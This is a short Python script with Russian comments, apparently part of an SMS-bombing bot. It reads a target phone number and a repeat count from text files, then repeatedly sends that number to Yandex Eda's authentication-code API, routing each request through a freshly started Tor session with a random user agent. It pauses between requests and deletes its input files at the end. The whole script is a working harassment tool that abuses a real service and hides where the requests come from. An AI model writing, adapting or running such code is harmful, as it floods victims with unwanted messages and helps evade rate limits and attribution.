import requests,fake_useragent,os,time,subprocess

user = fake_useragent.UserAgent().random #Случайные данные браузера

headers = {'user_agent': user}

def get_tor_session():   # Соединение через tor
	os.startfile(r'Укажите путь до файла tor.exe')
	session = requests.session()
	session.proxies = {'http':  'socks5://127.0.0.1:9050',
	                   'https': 'socks5://127.0.0.1:9050'}               
	return session

with open('file.txt') as fp:   # Буфер между ботом и телом программы ( можно реализовать более красиво и менее ресурсоёмко, но мне не хватает практических знаний )
    lines = fp.readlines() 
    nomer = int(lines[0])

with open('file2.txt') as fp2:
    lines2 = fp2.readlines() 
    inpnomers = int(lines2[0])

a = int(0)

while a < inpnomers:

	first_req = get_tor_session() 
	
	first_req.post(' https://eda.yandex.ru/api/v1/user/request_authentication_code', headers = headers, 
		json = {'phone_number': '+' + str(nomer)})
	print('YaEda отправлено')
	
	a +=1

	os.system("TASKKILL /F /IM "+'tor.exe') 
	time.sleep(150)


os.system("TASKKILL /F /IM "+'py.exe')
os.remove('file.txt')
os.remove('file2.txt')
